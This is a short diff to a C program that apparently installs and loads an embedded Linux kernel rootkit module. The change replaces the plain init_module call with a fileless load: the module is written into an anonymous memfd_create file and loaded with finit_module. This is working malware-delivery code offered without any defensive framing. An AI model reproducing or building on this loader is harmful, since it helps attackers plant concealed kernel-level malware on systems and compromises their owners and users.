@@ -1,5 +1,10 @@
+#define _GNU_SOURCE
+#include <fcntl.h>
 #include <linux/module.h>
 #include <stdio.h>
+#include <stdlib.h>
+#include <sys/mman.h>
+#include <sys/types.h>
 #include <syscall.h>
 #include <unistd.h>
 #include "../common.h"
@@ -27,11 +32,19 @@ int main(int argc, char *argv[])
     install_module(_binary_rootkit_ko_start, _binary_rootkit_ko_end, argv[1]);
 
     puts(INFO "Start loading kernel module...");
-    if (syscall(SYS_init_module, _binary_rootkit_ko_start,
-                _binary_rootkit_ko_end - _binary_rootkit_ko_start,
-                (char[]){'\0'})) {
+
+    int fd = syscall(SYS_memfd_create, "file", MFD_CLOEXEC);
+    if (fd == -1) {
+        puts(WARN "memfd_create error");
+        return -1;
+    }
+    write(fd, _binary_rootkit_ko_start,
+          _binary_rootkit_ko_end - _binary_rootkit_ko_start);
+    lseek(fd, 0, SEEK_SET);
+    if (syscall(SYS_finit_module, fd, "", 0)) {
         puts(WARN "You are not root");
         return -1;
     }
+    close(fd);
     return 0;
 }
